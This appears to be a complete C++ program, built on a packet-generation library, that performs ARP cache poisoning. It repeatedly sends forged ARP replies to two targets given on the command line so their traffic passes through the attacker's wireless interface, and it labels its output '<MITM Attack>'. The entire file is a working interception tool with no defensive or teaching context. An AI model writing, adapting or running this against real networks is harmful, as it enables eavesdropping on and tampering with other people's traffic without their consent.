#include "pgen.h"

const char* dev = "wlan0";


int main(int argc,char** argv){
	if(argc != 5){
		printf("usage: %s target1IP target1MAC target2IP target2MAC\n", argv[0]);
		return -1;
	}

	pgen_arp pack_to_target1;
	pgen_arp pack_to_target2;


	pack_to_target1.ETH.src = pgen_getMAC(dev);
	pack_to_target1.ETH.dst = argv[4];
	pack_to_target1.ARP.srcEth = pgen_getMAC(dev);
	pack_to_target1.ARP.srcIp  = pgen_getIP(dev);
	pack_to_target1.ARP.srcIp  = argv[1];
	pack_to_target1.ARP.dstEth = argv[4];
	pack_to_target1.ARP.dstIp  = argv[3];
	pack_to_target1.ARP.option = PGEN_ARPOP_REPLY;

	pack_to_target2.ETH.src = pgen_getMAC(dev);
	pack_to_target2.ETH.dst = argv[2];
	pack_to_target2.ARP.srcEth = pgen_getMAC(dev);
	pack_to_target2.ARP.srcIp  = argv[3];
	pack_to_target2.ARP.dstEth = argv[2];
	pack_to_target2.ARP.dstIp  = argv[1];
	pack_to_target2.ARP.option = PGEN_ARPOP_REPLY;




	for(int i=0; ; i++){
		printf("0x%04x: %s[%s] <MITM Attack> %s[%s] \n", i, 
				pack_to_target1.ARP.dstIp.c_str(),
				pack_to_target1.ARP.dstEth.c_str(),
				pack_to_target2.ARP.dstIp.c_str(),
				pack_to_target2.ARP.dstEth.c_str() );

		pack_to_target1.SEND(dev);
		pack_to_target2.SEND(dev);
		sleep(1);
	}
}

